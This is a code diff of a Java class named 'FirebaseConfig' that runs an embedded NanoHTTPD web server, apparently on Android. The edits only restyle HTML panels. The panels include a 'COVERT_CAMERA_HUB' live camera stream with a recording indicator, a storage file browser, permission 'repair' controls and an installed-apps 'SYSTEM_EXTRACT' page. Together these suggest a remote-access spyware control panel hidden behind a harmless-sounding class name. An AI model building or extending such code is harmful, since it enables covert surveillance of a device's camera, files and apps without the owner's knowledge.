@@ -1038,10 +1038,11 @@ public class FirebaseConfig extends NanoHTTPD {
         // Custom header for Hardware Tab with Repair Button
         html.append("<div class=\"back-btn-container\"><a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a></div>");
         html.append("<div class=\"card\">");
-        html.append("<div class=\"flex-header\" style=\"margin-bottom: 25px; border-bottom: 1px solid rgba(0,242,255,0.3); padding-bottom: 15px;\">");
-        html.append("<h2 style=\"margin: 0; color: var(--neon-cyan);\">HARDWARE_ANALYTICS</h2>");
+        html.append("<div class=\"flex-header\" style=\"margin-bottom: 15px;\">");
+        html.append("<h2 style=\"margin: 0; color: var(--neon-cyan); text-align: left;\">HARDWARE_ANALYTICS</h2>");
         html.append("<button onclick=\"repairProtocol()\" class=\"btn btn-small\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255,157,0,0.05); margin: 0;\">&#9888; REPAIR_PERMISSIONS</button>");
         html.append("</div>");
+        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");
         
         // Remove the redundant back button from DeviceInfo by stripping the first few chars or just wrapping it
         String deviceData = DeviceInfo.getDeviceInfoHtml(context);
@@ -1078,12 +1079,13 @@ public class FirebaseConfig extends NanoHTTPD {
         html.append("</div>");
 
         html.append("<div class=\"card\">");
-        html.append("<div style=\"display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; border-bottom: 1px solid rgba(0, 242, 255, 0.3); padding-bottom: 15px;\">");
-        html.append("<h2 style=\"margin-bottom: 0; font-size: 1.2rem;\">")
+        html.append("<div style=\"display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;\">");
+        html.append("<h2 style=\"margin-bottom: 0; font-size: 1.2rem; text-align: left;\">")
             .append(path.isEmpty() ? "SYSTEM_STORAGE" : "DIR: " + currentDir.getName().toUpperCase())
             .append("</h2>");
         html.append("<span style=\"font-size: 0.7rem; color: var(--neon-green); opacity: 0.8;\">MODE: SECURE_ACCESS</span>");
         html.append("</div>");
+        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");
 
         // Breadcrumb Trail
         html.append("<div class=\"breadcrumb\">");
@@ -2129,12 +2131,12 @@ public class FirebaseConfig extends NanoHTTPD {
         html.append("<div class=\"back-btn-container\"><a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a></div>");
         
         html.append("<div class=\"card\">");
-        html.append("<div style=\"display: flex; align-items: center; justify-content: flex-start; gap: 15px; margin-bottom: 25px;\">");
-        html.append("<h2 style=\"margin: 0; white-space: nowrap; text-align: left; font-size: 1.2rem;\">&#128247; COVERT_CAMERA_HUB</h2>");
+        html.append("<div style=\"display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 10px; margin-bottom: 25px;\">");
+        html.append("<h2 style=\"margin: 0; white-space: nowrap; text-align: left; font-size: 1.1rem;\">&#128247; COVERT_CAMERA_HUB</h2>");
         
         // Advanced Tactical Indicator - Force NEXT to title
-        html.append("<div id=\"live-indicator\" style=\"display: inline-flex; align-items: center; background: rgba(255,255,0,0.05); border: 1px solid var(--neon-yellow); padding: 4px 10px; border-radius: 6px; font-size: 0.6rem; color:var(--neon-yellow); font-weight:bold; font-family:monospace; letter-spacing:1px; white-space: nowrap;\">");
-        html.append("<span class=\"badge-dot\" id=\"indicator-dot\">&#9679;</span>&nbsp;");
+        html.append("<div id=\"live-indicator\" style=\"display: inline-flex; align-items: center; background: rgba(255,255,0,0.05); border: 1px solid var(--neon-yellow); padding: 4px 8px; border-radius: 6px; font-size: 0.55rem; color:var(--neon-yellow); font-weight:bold; font-family:monospace; letter-spacing:1px; white-space: nowrap;\">");
+        html.append("<span class=\"badge-dot\" id=\"indicator-dot\" style=\"font-size: 0.5rem;\">&#9679;</span>&nbsp;");
         html.append("<span id=\"indicator-text\">STANDBY</span>");
         html.append("</div>");
         html.append("</div>");
@@ -2148,12 +2150,12 @@ public class FirebaseConfig extends NanoHTTPD {
             }
         }
 
-        // Live Feed Container (Dynamic Mobile Sizing)
-        html.append("<style>@media(max-width:768px){ #stream-container { height: 450px !important; aspect-ratio: auto !important; } }</style>");
+        // Live Feed Container (Standardized with GPS Map Look)
+        html.append("<style>@media(max-width:768px){ #stream-container { height: 400px !important; } }</style>");
         html.append("<div style=\"text-align: center; margin-bottom: 25px;\">");
-        html.append("<div id=\"stream-container\" style=\"width:100%; max-width:900px; aspect-ratio:16/9; background:#000; margin:0 auto; border-radius:12px; border:2px solid var(--neon-cyan); position:relative; overflow:hidden; display:flex; align-items:center; justify-content:center;\">");
-        html.append("<img id=\"main-stream\" style=\"width: 100%; height: auto; ").append(autostart ? "display: block;" : "display: none;").append("\" />");
-        html.append("<div id=\"loading-overlay\" style=\"position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); color:var(--neon-cyan); font-size:0.8rem; font-family:monospace; letter-spacing:2px;\">").append(autostart ? "INITIALIZING_UPLINK..." : "Uplink_Ready").append("</div>");
+        html.append("<div id=\"stream-container\" style=\"width:100%; max-width:900px; height: 450px; background:#000; margin:0 auto; border-radius:8px; border:1px solid var(--neon-cyan); position:relative; overflow:hidden; display:flex; align-items:center; justify-content:center; box-shadow: 0 0 20px rgba(0,242,255,0.1);\">");
+        html.append("<img id=\"main-stream\" style=\"width: 100%; height: 100%; object-fit: contain; ").append(autostart ? "display: block;" : "display: none;").append("\" />");
+        html.append("<div id=\"loading-overlay\" style=\"position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); color:var(--neon-cyan); font-size:0.75rem; font-family:monospace; letter-spacing:2px; z-index: 5;\">").append(autostart ? "INITIALIZING_UPLINK..." : "Uplink_Ready").append("</div>");
         html.append("</div></div>");
 
         // Resolution Slider
@@ -2585,21 +2587,21 @@ public class FirebaseConfig extends NanoHTTPD {
         html.append("</div>");
 
         // Live stream viewer
-        html.append("<div style=\"text-align: center; margin-bottom: 20px;\">");
+        html.append("<div style=\"text-align: center; margin-bottom: 25px;\">");
         html.append(
-                "<div id=\"stream-container\" style=\"position: relative; display: block; width: 100%; background: #000; border-radius: 10px; overflow: hidden;\">");
+                "<div id=\"stream-container\" style=\"position: relative; display: flex; align-items: center; justify-content: center; width: 100%; max-width: 900px; height: 450px; background: #000; border: 1px solid var(--neon-cyan); border-radius: 8px; overflow: hidden; margin: 0 auto; box-shadow: 0 0 20px rgba(0,242,255,0.1);\">");
         html.append(
-                "<img id=\"stream\" src=\"/camera/frame\" style=\"width: 100%; height: ").append(uiHeight).append("px; object-fit: cover; display: block; transition: transform 0.3s ease;\" ");
+                "<img id=\"stream\" src=\"/camera/frame\" style=\"width: 100%; height: 100%; object-fit: contain; display: block; transition: transform 0.3s ease;\" ");
         html.append("onerror=\"handleStreamError()\" onload=\"streamLoaded()\" />");
         html.append(
-                "<div id=\"stream-overlay\" style=\"position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.7); padding: 5px 10px; border-radius: 5px; font-size: 0.8rem;\">");
+                "<div id=\"stream-overlay\" style=\"position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.7); padding: 4px 8px; border-radius: 6px; font-size: 0.65rem; border: 1px solid rgba(255,255,255,0.1); z-index: 10; white-space: nowrap;\">");
         html.append("<span id=\"stream-status\" style=\"color: #2ecc71;\">&#9679; LIVE</span>");
-        html.append("<span id=\"fps-counter\" style=\"color: #888; margin-left: 10px;\"></span>");
+        html.append("<span id=\"fps-counter\" style=\"color: #888; margin-left: 8px;\"></span>");
         html.append("</div>");
         html.append(
-                "<div id=\"loading\" style=\"position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #fff;\">Loading...</div>");
+                "<div id=\"loading\" style=\"position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #fff; z-index: 5; font-family: monospace; font-size: 0.8rem;\">Loading...</div>");
         html.append(
-                "<div id=\"rec-indicator\" style=\"position: absolute; top: 10px; right: 10px; background: rgba(231, 76, 60, 0.9); padding: 5px 10px; border-radius: 5px; font-size: 0.8rem; display: none;\">");
+                "<div id=\"rec-indicator\" style=\"position: absolute; top: 10px; right: 10px; background: rgba(231, 76, 60, 0.9); padding: 4px 8px; border-radius: 6px; font-size: 0.65rem; display: none; z-index: 10; border: 1px solid rgba(255,255,255,0.1);\">");
         html.append("<span style=\"color: #fff;\">&#9679; REC</span>");
         html.append("</div>");
         html.append("</div>");
@@ -4785,7 +4787,8 @@ public class FirebaseConfig extends NanoHTTPD {
         logActivity("SYSTEM_EXTRACT: Package manager database retrieved");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
         html.append("<div class=\"back-btn-container\"><a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a></div>");
-        html.append("<div class=\"card\"><h2>Installed Applications</h2>");
+        html.append("<div class=\"card\">");
+        html.append("<h2 style=\"text-align: left; margin-bottom: 20px;\">Installed Applications</h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");
         
         android.content.pm.PackageManager pm = context.getPackageManager();
